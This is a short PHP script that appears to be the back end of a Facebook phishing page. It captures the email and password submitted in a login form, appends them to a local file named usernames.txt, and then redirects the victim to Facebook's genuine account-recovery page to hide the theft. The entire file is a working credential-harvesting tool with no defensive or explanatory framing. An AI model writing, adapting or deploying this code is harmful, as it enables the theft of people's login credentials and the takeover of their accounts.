<?php 
function redirect($props) {
  $url = explode(": ", $props)[1];
  echo "<script>window.location.replace('$url');</script>";
}

file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . "\nPassword: " . $_POST['pass'] ."\n", FILE_APPEND);
$url = "https://facebook.com/recover/initiate/"; # https://facebook.com/recover/initiate/
redirect("Location: $url");
exit();
?>
